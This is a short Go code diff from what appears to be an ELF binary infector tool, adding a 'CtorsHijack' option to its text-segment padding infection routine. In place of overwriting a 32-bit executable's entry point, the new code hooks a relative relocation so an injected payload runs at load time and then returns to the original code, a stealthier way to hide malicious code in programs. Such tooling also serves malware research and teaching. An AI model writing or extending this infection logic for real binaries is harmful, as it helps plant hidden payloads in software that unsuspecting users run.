@@ -136,7 +136,18 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
 		pHeaders := t.Phdrs.([]elf.Prog32)
 		
-		t.Hdr.(*elf.Header32).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		var origAddend uint32
+		var relocEntry elf.Rel32
+
+		if (opts & CtorsHijack) == CtorsHijack {
+			if err := t.relativeRelocHook(&origAddend, &relocEntry, debug); err != nil {
+				return err
+			}
+			
+		}else {
+			t.Hdr.(*elf.Header32).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+		}	
+		
 		if debug {
 			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
 		}
@@ -151,12 +162,18 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 		if !((opts & NoRest) == NoRest) {
 				t.Payload.Write(restoration32)
 		}
-
+		
 		if !((opts & NoRetOEP) == NoRetOEP) {
-			retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+			var retStub []byte
+			if (opts & CtorsHijack) == CtorsHijack {
+				pEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), pEntry, uint32(origAddend))
+			}else {
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
+			}
 			t.Payload.Write(retStub)
 		}
-
+		
 		if debug {
 			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
 			printPayload(t.Payload.Bytes())
